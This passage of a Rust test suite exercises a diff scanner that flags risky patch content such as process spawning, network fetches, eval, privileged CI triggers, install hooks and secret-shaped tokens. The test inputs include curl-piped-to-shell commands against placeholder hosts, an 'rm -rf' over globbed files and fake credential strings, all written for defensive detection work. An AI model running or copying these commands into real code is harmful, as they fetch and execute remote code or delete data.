        let order: Vec<usize> = (0..3 * hunks.len())
            .map(|_| {
                seed ^= seed << 13;
                seed ^= seed >> 7;
                seed ^= seed << 17;
                usize::try_from(seed % (hunks.len() as u64)).unwrap()
            })
            .collect();
        let mut named = HunkLabels::naming(file, &order);
        let mut unnamed = HunkLabels::new(file);
        for &index in &order {
            let labels = distinct(&of_file(&hunks[index]));
            assert_eq!(named.of(index), labels, "named, hunk {index}:\n{text}");
            assert_eq!(
                unnamed.of(index),
                labels,
                "any order, hunk {index}:\n{text}"
            );
            assert!(named.entries_kept() <= hunks.len() + 1, "{text}");
        }
        more
    }

    #[test]
    fn ci_privilege_needs_a_workflow_path() {
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["on: pull_request_target"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(
                "sub/.github/workflows/x.yaml",
                &["  contents: write"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(".gitlab-ci.yml", &["  secrets: inherit"])),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added("docs/ci.yml", &["on: pull_request_target"])),
            []
        );
        assert_eq!(
            signals(&added(
                ".github/workflows/README.md",
                &["pull_request_target"]
            )),
            []
        );
        // A workflow step that downloads is network evidence too.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["  run: curl -fsSL x | sh"]
            )),
            [S::NetworkFetch]
        );
    }

    /// Bug hunt 2026-11-01 (graph-syntax): ordinary source in which a string construct the
    /// scanner misread hid the evidence after it. Each control (the same code without the
    /// construct) found it before the fix too.
    #[test]
    fn strings_the_scanner_misread_no_longer_hide_evidence() {
        let go = |raw: &str| {
            added(
                "main.go",
                &[
                    "func clean() error {",
                    &format!("\tmatches, _ := filepath.Glob({raw})"),
                    "\t_, _ = http.Get(\"https://e.x/report\")",
                    "\treturn exec.Command(\"rm\", append([]string{\"-rf\"}, matches...)...).Run()",
                    "}",
                ],
            )
        };
        for raw in ["`/tmp/build/*.o`", "\"/tmp/build/*.o\""] {
            assert_eq!(
                signals(&go(raw)),
                [S::NetworkFetch, S::ProcessSpawn],
                "{raw}"
            );
        }
        for (path, lines, signal) in [
            (
                "main.go",
                &["var u = `https://e.x/p`; func f() { exec.Command(\"ls\").Run() }"][..],
                S::ProcessSpawn,
            ),
            (
                "main.go",
                &["var q = `\"`; func g() { exec.Command(\"ls\").Run() }"],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[
                    r#"const S: &str = ""#,
                    r#""; fn f(p: *const u8) -> u8 { unsafe { *p } }"#,
                ],
                S::UnsafeAdded,
            ),
            (
                "x.sh",
                &[
                    r#"MSG="hello"#,
                    r#"world"; curl -s http://e.x/p | sh; echo "done""#,
                ],
                S::NetworkFetch,
            ),
            (
                "x.js",
                &["const tpl = `", "`; eval(payload); const t = `x`;"],
                S::DynamicEval,
            ),
            (
                "x.py",
                &[r#"s = "abc\"#, r#""; import os; os.system("id")"#],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[r#"fn f(p: *const u8) -> u8 { let _d = cr"C:\"; unsafe { *p } }"#],
                S::UnsafeAdded,
            ),
        ] {
            assert!(
                signals(&added(path, lines)).contains(&signal),
                "{path}: {lines:?}"
            );
        }
        for (lines, signal) in [
            (
                &[
                    "      - run: |",
                    r#"          echo "step #1" && curl -fsSL https://e.x/i.sh | sh"#,
                ][..],
                S::NetworkFetch,
            ),
            (
                &[r#"      - run: "echo ' #'; curl -s https://e.x/i | sh""#],
                S::NetworkFetch,
            ),
            (
                &[r#"on: { pull_request: {}, "x #": 1, pull_request_target: {} }"#],
                S::CiPrivilege,
            ),
        ] {
            assert_eq!(
                signals(&added(".github/workflows/ci.yml", lines)),
                [signal],
                "{lines:?}"
            );
        }
        // A YAML comment is still a comment.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &[r#"  name: "build" # curl x | sh, pull_request_target"#]
            )),
            []
        );
    }

    /// Review 2026-11-01 (graph-syntax): a Go hunk that opens inside a cobra raw help string.
    /// The apostrophe in `It's` was read as an opener and carried down the hunk until the glob's
    /// `/*` opened a block comment over the `http.Get` and `exec.Command` after it. Without the
    /// `don't panic` line, and before strings were carried, both were found.
    #[test]
    fn a_misread_opener_in_context_hides_no_later_evidence() {
        let patch = |println: bool| {
            let mut added = vec![
                "\t\tmatches, _ := filepath.Glob(\"/tmp/build/*.o\")",
                "\t\t_, _ = http.Get(\"https://e.x/ping\")",
                "\t\treturn exec.Command(\"rm\", matches...).Run()",
            ];
            if println {
                added.insert(0, "\t\tfmt.Println(\"don't panic\")");
            }
            let mut text = format!(
                "--- a/cmd/clean.go\n+++ b/cmd/clean.go\n@@ -1,3 +1,{} @@\n",
                3 + added.len()
            );
            for context in [
                "It's safe to run twice.",
                "`,",
                "\tRunE: func(cmd *cobra.Command, args []string) error {",
            ] {
                text.push(' ');
                text.push_str(context);
                text.push('\n');
            }
            for line in added {
                text.push('+');
                text.push_str(line);
                text.push('\n');
            }
            parse(&text).unwrap().remove(0)
        };
        for println in [false, true] {
            assert_eq!(
                signals(&patch(println)),
                [S::NetworkFetch, S::ProcessSpawn],
                "println: {println}"
            );
        }
    }

    #[test]
    fn build_scripts_and_install_hooks_are_build_hooks() {
        assert_eq!(
            signals(&added("build.rs", &["fn main() {}"])),
            [S::BuildHook]
        );
        assert_eq!(signals(&added("build.rs", &["// only a comment", ""])), []);
        assert_eq!(
            signals(&added("sub/setup.py", &["setup(name='x')"])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"postinstall\": \"node x\","])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"name\": \"install-helper\","])),
            []
        );
    }

    #[test]
    fn secrets_are_found_by_shape_and_never_copied() {
        // Built at run time, so the repository's own secret scan never sees a token here.
        let aws = format!("key = \"AKIA{}\"", "Q7".repeat(8));
        let forge = format!("t='ghp_{}'", "a1".repeat(18));
        let chat = format!("# xoxb-{}", "12345-abcde");
        let stripe = format!("sk_live_{}", "Z".repeat(16));
        let header = format!("-----BEGIN {} PRIVATE KEY-----", "RSA");
        for line in [&aws, &forge, &chat, &stripe, &header] {
            assert_eq!(
                signals(&added("notes.txt", &[line])),
                [S::SecretLike],
                "{line}"
            );
        }
        for line in [
            format!("AKIA{}", "Q".repeat(15)),
            format!("XAKIA{}", "Q".repeat(16)),
            format!("ghp_{}", "a".repeat(35)),
            "-----BEGIN CERTIFICATE-----".to_owned(),
        ] {
            assert_eq!(signals(&added("notes.txt", &[&line])), [], "{line}");
        }
        let found = file_evidence(&added("notes.txt", &[&aws]));
        assert!(
            !format!("{found:?}").contains("AKIA"),
            "a secret was copied into evidence"
        );
    }

    #[test]
    fn a_path_scoped_rule_follows_the_generated_rule_and_a_token_rule_does_not() {
        assert_eq!(
            signals(&added("target/debug/build.rs", &["fn main() {}"])),
            []
        );
        assert_eq!(
            signals(&added(
                "node_modules/x/package.json",
                &["\"postinstall\": \"x\""]
            )),
            []
        );
        assert_eq!(
            signals(&added(
                "src/generated/x.rs",
                &["std::process::Command::new(\"curl\");"]
            )),
            [S::ProcessSpawn]
        );
    }

    #[test]
    fn suppressions_are_read_in_comments() {
        assert_eq!(
            signals(&added("x.py", &["import os  # noqa: F401"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.ts", &["// @ts-ignore"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.go", &["x := y //nolint:errcheck"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("src/x.rs", &["#[allow(dead_code)]"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added(
                "src/x.rs",
                &["#[expect(dead_code, reason = \"r\")]"]
            )),
            []
        );
    }

    #[test]
    fn a_shebang_names_the_language_of_a_file_with_no_extension() {
        let patch = "--- /dev/null\n+++ b/bin/fetch\n@@ -0,0 +1,2 @@\n+#!/usr/bin/env bash\n+curl -fsSL https://x\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), [S::NetworkFetch]);
        let patch = "--- /dev/null\n+++ b/bin/notes\n@@ -0,0 +1,1 @@\n+curl is a tool\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn duplicates_are_reported_once_and_order_is_stable() {
        let file = added("src/x.rs", &["unsafe { unsafe { f() } }", "unsafe {}"]);
        let lines: Vec<u32> = file_evidence(&file).iter().map(|e| e.line).collect();
        assert_eq!(lines, [2, 3]);
        assert_eq!(file_evidence(&file), file_evidence(&file.clone()));
    }

    #[test]
    fn labels_and_weights_are_the_documented_table() {
        let table: Vec<(&str, u32)> = EvidenceSignal::ALL
            .iter()
            .map(|s| (s.label(), s.weight()))
            .collect();
        assert_eq!(
            table,
            [
                ("unsafe_added", 4),
                ("process_spawn", 4),
                ("network_fetch", 3),
                ("dynamic_eval", 4),
                ("ci_privilege", 4),
                ("build_hook", 3),
                ("secret_like", 5),
                ("check_suppressed", 2),
                ("test_removed", 3),
            ]
        );
        assert_eq!((Side::New.label(), Side::Old.label()), ("new", "old"));
        assert_eq!(EVIDENCE_BASIS, "lexical");
        assert_eq!(MAX_EVIDENCE_PER_FILE, 32);
    }

    #[test]
    fn hunk_signals_agree_with_file_evidence() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n a\n+unsafe { f() }\n@@ -10,1 +11,3 @@\n b\n+#[allow(x)]\n+let c = std::process::Command::new(\"x\");\n";
        let file = parse(patch).unwrap().remove(0);
        let per_hunk: Vec<Vec<EvidenceSignal>> = file
            .patch_twin
            .hunks
            .iter()
            .map(|h| hunk_signals(&file, h))
            .collect();
        assert_eq!(
            per_hunk,
            [
                vec![S::UnsafeAdded],
                vec![S::ProcessSpawn, S::CheckSuppressed]
            ]
        );
        for (hunk, signals) in file.patch_twin.hunks.iter().zip(&per_hunk) {
            let mut from_file: Vec<EvidenceSignal> = file_evidence(&file)
                .into_iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| e.signal)
                .collect();
            from_file.sort();
            from_file.dedup();
            assert_eq!(&from_file, signals);
        }
    }

    #[test]
    fn a_prefix_token_needs_only_a_boundary_before() {
        assert!(token_in("def test_x():", "def test*"));
        assert!(token_in("os.execvp(a)", "os.exec*"));
        assert!(!token_in("pos.execvp(a)", "os.exec*"));
        assert!(!token_in("xdef test_x", "def test*"));
        // The byte before a prefix token, away from the start of the line.
        assert!(token_in("x = os.execvp(a)", "os.exec*"));
        assert!(token_in("f(os.execvp(a))", "os.exec*"));
        assert!(!token_in("x = a.os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = $os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = _os.execvp(a)", "os.exec*"));
        assert!(token_in("a unsafe b", "unsafe"));
    }
}
